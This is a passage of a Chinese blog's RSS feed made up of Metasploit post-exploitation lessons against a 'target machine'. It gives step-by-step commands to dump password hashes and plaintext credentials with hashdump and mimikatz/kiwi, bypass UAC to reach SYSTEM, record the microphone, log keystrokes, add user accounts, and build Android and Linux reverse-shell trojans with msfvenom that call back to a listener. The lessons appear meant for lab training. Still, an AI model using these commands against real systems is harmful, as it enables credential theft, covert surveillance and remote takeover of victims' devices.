&lt;p&gt;如果提示这证明本机并没有配置自动登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493985741.png&#34; alt=&#34;1644493985741&#34;&gt;&lt;/p&gt;
&lt;p&gt;2  还可以通过导出 SAM 数据库中的本地用户账号（注意需要提权到 SYSTEM）&lt;/p&gt;
&lt;p&gt;run post/windows/gather/smart_hashdump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493996549.png&#34; alt=&#34;1644493996549&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;用户名&lt;/th&gt;
&lt;th&gt;SID&lt;/th&gt;
&lt;th&gt;LM 哈希:&lt;/th&gt;
&lt;th&gt;NTLM 哈希 1:::&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;mb&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;aad3b435b51404eeaad3b435b51404ee&lt;/td&gt;
&lt;td&gt;32ed87bdb5fdc5e9cba88547376818d4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494007420.png&#34; alt=&#34;1644494007420&#34;&gt;&lt;/p&gt;
&lt;p&gt;3  使用  hashdump 获取密码（注意需要提权到 SYSTEM 才能使用）&lt;/p&gt;
&lt;p&gt;终端内输入  run hashdump&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494019182.png&#34; alt=&#34;1644494019182&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用在线解析工具  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY21kNS5jb20v&#34;&gt;https://www.cmd5.com/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;NTLM 哈希 例子：32ed87bdb5fdc5e9cba88547376818d4&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494029236.png&#34; alt=&#34;1644494029236&#34;&gt;&lt;/p&gt;
&lt;p&gt;4  使用 load kiwi（使用 kiwi 模块需要 system 权限）&lt;/p&gt;
&lt;p&gt;kiwi_cmd 模块可以让我们使用 mimikatz 的全部功能， mimikatz 的命令直接在 kiwi_cmd 里直接使用&lt;/p&gt;
&lt;p&gt;5.1 终端输入  load kiwi&lt;/p&gt;
&lt;p&gt;5.2 creds_all  直接获取密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494040171.png&#34; alt=&#34;1644494040171&#34;&gt;&lt;/p&gt;
&lt;p&gt;5.3 使用  kiwi_cmd sekurlsa::logonpasswords  获取密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494050257.png&#34; alt=&#34;1644494050257&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;kiwi 参数和描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;creds_all：列举所有凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;creds_kerberos：列举所有 kerberos 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;creds_msv：列举所有 msv 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;creds_ssp：列举所有 ssp 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;creds_tspkg：列举所有 tspkg 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;creds_wdigest：列举所有 wdigest 凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;dcsync：通过 DCSync 检索用户帐户信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;golden_ticket_create：创建黄金票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;kerberos_ticket_list：列举 kerberos 票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;kerberos_ticket_purge：清除 kerberos 票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;kerberos_ticket_use：使用 kerberos 票据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;lsa_dump_sam：dump 出 lsa 的 SAM&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;td&gt;lsa_dump_secrets：dump 出 lsa 的密文&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;password_change：修改密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;wifi_list：列出当前用户的 wifi 配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;wifi_list_shared：列出共享 wifi 配置文件 / 编码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/</guid>
            <title>后渗透之提权Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:24:23 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台 windiows 靶机&lt;/p&gt;
&lt;h1 id=&#34;二-实战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实战&#34;&gt;#&lt;/a&gt; 二、实战&lt;/h1&gt;
&lt;p&gt;1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png&#34; alt=&#34;1644493116225&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法一、 meterpreter 中输入：getsystem&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png&#34; alt=&#34;1644493125642&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法二、使用 msf 模块提权&lt;/p&gt;
&lt;p&gt;要想提权必须是已经拿到 meterpreter  然后将当前 meterpreter 后台 meterprerer 中输入  background&lt;/p&gt;
&lt;p&gt;1、 查看可用模块  MSF 终端中输入   search bypassuac   查看提权模块&lt;/p&gt;
&lt;p&gt;2、 选择一个适合当前系统的提权模块  我这边使用的是 win10 系统&lt;/p&gt;
&lt;p&gt;那我们使用：use  exploit/windows/local/bypassuac_windows_store_reg  尝试提权&lt;/p&gt;
&lt;p&gt;这个模块不行就换一个 use exploit/windows/local/bypassuac_sluihijack&lt;/p&gt;
&lt;p&gt;或者  use exploit/windows/local/bypassuac_dotnet_profiler&lt;/p&gt;
&lt;p&gt;3 配置模块使用参数   终端内输入： show options&lt;/p&gt;
&lt;p 需要提权的session id&gt;4 可以看到需要配置 session  终端内输入：set session &lt;/p&gt;
&lt;p&gt;5 执行提权  终端内输入：run&lt;/p&gt;
&lt;p&gt;6 获取到 meterpreter 后 我们在终端内 输入 getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限&lt;/p&gt;
&lt;p&gt;7 获取权限完成后 输入 getuid 即可看到  已经获取到 SYSTEM 最高权限了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png&#34; alt=&#34;1644493163472&#34;&gt;&lt;/p&gt;
&lt;p&gt;看到这个证明已经将权限提升成功&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/</guid>
            <title>后渗透之调用音频设备录音</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/</link>
            <pubDate>Thu, 12 Jan 2023 21:20:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;一、环境准备&lt;br&gt;
 MSF-Metasploit Framework&lt;br&gt;
 一台安装手机或者模拟器&lt;br&gt;
二、实践&lt;/p&gt;
&lt;p&gt;record_mic  包含 4 个可选参数 分别为&lt;/p&gt;
&lt;p&gt;-d  是设置录音时长的&lt;/p&gt;
&lt;p&gt;-f 设置未见路径的&lt;/p&gt;
&lt;p&gt;-h  查看帮助的&lt;/p&gt;
&lt;p&gt;-p  控制自动播放的&lt;/p&gt;
&lt;p&gt;一条简单的录音语句&lt;/p&gt;
&lt;p&gt;record_mic -d  10 -p true&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/</guid>
            <title>后渗透之创建账户Windows</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/</link>
            <pubDate>Thu, 12 Jan 2023 21:17:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;一、环境准备&lt;/p&gt;
&lt;p&gt;1 MSF-Metasploit Framework&lt;/p&gt;
&lt;p&gt;2 一台获取到 meterpreter 的靶机&lt;/p&gt;
&lt;p&gt;二、实际操作&lt;/p&gt;
&lt;p&gt;1、先看下目标靶机已存在用户  meterpreter 中输入：run post/windows/gather/enum_logged_on_users&lt;/p&gt;
&lt;p&gt;![1643108073546](22 后渗透之创建账户（Windows）.assets/1643108073546.png)&lt;/p&gt;
&lt;p&gt;2、使用 getgui 创建 一个用户名为 msb  密码为 123456  的账户&lt;/p&gt;
&lt;p&gt;run getgui -u msb -p 123456&lt;/p&gt;
&lt;p 密码&gt;run getgui -u {用户名}-p&lt;/p&gt;
&lt;p&gt;进入 win 的运行输入 netplwiz 可以查看账户创建情况&lt;/p&gt;
&lt;p&gt;![1643108092979](22 后渗透之创建账户（Windows）.assets/1643108092979.png)&lt;/p&gt;
&lt;p&gt;[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到 system）&lt;/p&gt;
&lt;p&gt;2.1 绕过 UAC 提权&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/&lt;em&gt;ask&lt;/em&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</guid>
            <title>后渗透之下载文件屏幕截图键盘记录</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</link>
            <pubDate>Thu, 12 Jan 2023 21:08:41 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;第 21 课 ：后渗透之上传下载文件&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;ID&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td&gt;upload&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;传文件到靶机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td&gt;download&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;从靶机下载文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;第 22 课：后渗透之屏幕截图&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;screenshot&lt;/td&gt;
&lt;td&gt;截图（Windows）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;第 23 课：后渗透之键盘记录&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;Conmmand&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;keyscan_start&lt;/td&gt;
&lt;td&gt;启动键盘记录 (Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;keyscan_dump&lt;/td&gt;
&lt;td&gt;导出键盘 (Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;keyscan_stop&lt;/td&gt;
&lt;td&gt;停止键盘记录 (Windows)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</guid>
            <title>后渗透之访问文件系统</title>
            <link>https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</link>
            <pubDate>Thu, 12 Jan 2023 21:05:24 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-后渗透之访问文件系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-后渗透之访问文件系统&#34;&gt;#&lt;/a&gt; 一、后渗透之访问文件系统&lt;/h1&gt;
&lt;p&gt;1. 文件交互指令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;ID&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Command&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;cat&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;读取文件内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;cd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;切换靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;cp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;复制文件到目标&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;mv&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;移动到目标&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;chmod&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;修改文件权限（比如 chmod 777 shell.elf）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;6&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;del / rm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;删除靶机文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;7&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;dir&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打印靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;8&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;mkdir&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;在靶机上创建目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;9&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;rmdir&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;删除靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;10&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;edit&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;编辑文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;11&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;getlwd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打印本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;12&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;getwd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打印靶机目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;13&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;lcd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;更改本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;14&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;lls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;列出本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;15&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;ls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;列出靶机文件目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;lpwd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打印本地目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;17&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;pwd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打印工作目录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;19&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;search&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;搜索文件 详情 search -h&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Linux 权限理解&lt;/p&gt;
&lt;p 文件名.后缀&gt;chmod  777  &lt;/p&gt;
&lt;p&gt;chmod  777    shell.elf&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/</guid>
            <title>生成木马反弹shell_Android</title>
            <link>https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Android/</link>
            <pubDate>Thu, 12 Jan 2023 16:04:52 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;MSF-Metasploit Framework&lt;/li&gt;
&lt;li&gt;一台安装手机或者模拟器&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;二-木马生成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-木马生成&#34;&gt;#&lt;/a&gt; 二、木马生成&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;生成一个 APK 后门&lt;/li&gt;
&lt;li&gt;msfvenom -p android/meterpreter/reverse_tcp LHOST={监控 IP} LPORT={监控端口} R&amp;gt;k.apk。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.38  LPORT=4567 R&amp;gt;k.apk&lt;/p&gt;
&lt;h1 id=&#34;三-配置监控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-配置监控&#34;&gt;#&lt;/a&gt; 三、配置监控&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;启动 msf   终端内输入：msfconsole 启动 msf![1643003592876](21 通过木马反弹 shell（Android）.assets/1643003592876.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;载入监控模块  msf 中输入：  use exploit/multi/handler&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;载入 payload MSF 终端中输入： set payload android/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;![1643003612323](21 通过木马反弹 shell（Android）.assets/1643003612323.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置 payload  MSF 终端中输入：show options&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置监控 IP MSF 中输入：set lhost  &amp;lt;监控的 IP&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置监控端口  MSF 中输入：set lporr  &amp;lt;监控的端口&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行监控  msf 终端中输入： run![1643003633911](21 通过木马反弹 shell（Android）.assets/1643003633911.png)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;四-攻击利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-攻击利用&#34;&gt;#&lt;/a&gt; 四、攻击利用&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;将木马上传到靶机&lt;/li&gt;
&lt;li&gt;在靶机上执行木马&lt;/li&gt;
&lt;li&gt;完成攻击利用！[1643003654523](21 通过木马反弹 shell（Android）.assets/1643003654523.png)&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Linux/</guid>
            <title>生成木马反弹shell_Linux</title>
            <link>https://mangpumo.github.io/2023/01/12/%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell-Linux/</link>
            <pubDate>Thu, 12 Jan 2023 16:03:27 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、环境准备&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;MSF-Metasploit Framework&lt;/li&gt;
&lt;li&gt;一台靶机&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;二-木马生成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-木马生成&#34;&gt;#&lt;/a&gt; 二、木马生成&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;生成一个 Linux 后门&lt;/li&gt;
&lt;li&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={监控 IP} LPORT={监控端口} -f elf &amp;gt; shell.elf!![1643108165465](22 通过木马反弹 shell（Linux）.assets/1643108165465.png)&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;三-配置监控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-配置监控&#34;&gt;#&lt;/a&gt; 三、配置监控&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;启动 msf   终端内输入：msfconsole 启动 msf&lt;/p&gt;
&lt;p&gt;![1643108186343](22 通过木马反弹 shell（Linux）.assets/1643108186343.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;载入监控模块  msf 中输入：  use exploit/multi/handler&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;加载 payload  msf 终端中输入：set payload linux/x64/meterpreter/reverse_tcp&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置 payload  msf 终端中输入：show options&lt;/p&gt;
&lt;p&gt;![1643108202630](22 通过木马反弹 shell（Linux）.assets/1643108202630.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li 监控ip&gt;
&lt;p&gt;配置 payload 监控 IP msf 终端中输入： set  lhost &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
